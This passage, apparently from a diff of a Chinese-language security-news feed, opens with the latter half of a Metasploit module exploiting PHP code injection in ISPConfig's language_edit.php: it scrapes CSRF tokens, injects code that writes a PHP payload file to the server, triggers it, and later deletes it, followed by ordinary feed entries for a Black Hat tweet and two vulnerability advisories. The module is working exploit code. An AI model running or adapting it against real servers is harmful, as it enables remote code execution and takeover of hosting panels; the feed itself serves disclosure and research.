class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,&#x27;&lt;?php <span class="hljs-subst">#&#123;php_payload&#125;</span> ?&gt;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/06/27/twitter_3070689907/"/>
-    <id>http://example.com/2025/06/27/twitter_3070689907/</id>
-    <published>2025-06-27T13:00:28.637Z</published>
-    <updated>2025-06-27T13:00:28.632Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 准备好参加在#sectorca举行的#BlackHat创业焦点大赛吧！🌟 这是在充满活力的#网络安全世界中闪耀并展示你突破性想法的绝佳机会。立即报名你的#创业项目，提升知名度，与行业领袖建立联系，加速你的成长。决赛选手将争夺参加2026年Black Hat USA的宝贵席位。别错过这个难以置信的机会——你的创新可能成为焦点 &gt;&gt; <a href="https://t.co/IaqE2rEb17">https://t.co/IaqE2rEb17</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938577072936354227">https://x.com/BlackHatEvents/status/1938577072936354227</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 准备好参加在#sectorca举行的#BlackHat创业焦点大赛吧！🌟 这是在充满活力的#网络安全世界中闪耀并展示你突破性想法的绝佳机会。立即</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
-    <link href="http://example.com/2025/06/27/github_2980499533/"/>
-    <id>http://example.com/2025/06/27/github_2980499533/</id>
-    <published>2025-06-27T13:00:13.627Z</published>
-    <updated>2025-06-27T13:00:13.624Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gqpr-crmw-v8qw">https://github.com/advisories/GHSA-gqpr-crmw-v8qw</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52722">https://nvd.nist.gov/vuln/detail/CVE-2025-52722</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/classiera/vulnerability/wordpress-classiera-4-0-34-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/classiera/vulnerability/wordpress-classiera-4-0-34-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gqpr-crmw-v8qw">https://github.com/advisories/GHSA-gqpr-crmw-v8qw</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in JoinWebs Classiera allows SQL Injection. This issue affects Classiera: from n&#x2F;a through 4.0.34.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gqpr-crmw-v8qw&quot;&gt;https://github.com/advisories/GHSA-gqpr-crmw-v8qw&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Deserialization of Untrusted Data vulnerability in wpeverest Everest Forms allows Object</title>
-    <link href="http://example.com/2025/06/27/github_3110947770/"/>
-    <id>http://example.com/2025/06/27/github_3110947770/</id>
-    <published>2025-06-27T13:00:12.310Z</published>
-    <updated>2025-06-27T13:00:12.308Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gvc8-gf46-mjvf">https://github.com/advisories/GHSA-gvc8-gf46-mjvf</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52709">https://nvd.nist.gov/vuln/detail/CVE-2025-52709</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-3-2-2-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-3-2-2-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gvc8-gf46-mjvf">https://github.com/advisories/GHSA-gvc8-gf46-mjvf</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in wpeverest Everest Forms allows Object Injection. This issue affects Everest Forms: from n&#x2F;a through 3.2.2.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gvc8-gf46-mjvf&quot;&gt;https://github.com/advisories/GHSA-gvc8-gf46-mjvf&lt;/a&gt;&lt;/p</summary>
       
     
     
